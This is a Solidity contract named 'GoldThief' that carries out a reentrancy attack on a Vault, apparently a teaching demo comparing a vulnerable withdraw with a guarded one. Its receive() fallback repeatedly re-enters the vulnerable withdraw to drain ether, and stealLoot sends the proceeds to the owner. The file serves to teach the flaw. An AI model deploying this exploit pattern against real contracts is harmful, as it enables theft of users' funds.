// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.18;

// interface for the Vault contract
interface IVault {

    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {

    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;


    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require (msg.value >= 1 ether, "Need atleast 1 eth");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    function attackSafe() external payable {
        require(msg.sender == owner, "only owner");
        require (msg.value >= 1 ether, "need atleat 1 Eth");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable {
        attackCount ++;

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }
    if (attackingSafe) {
        targetVault.safeWithdraw();   // this will fails due to reentrant
    }
    }

    function stealLoot() external {
        require (msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}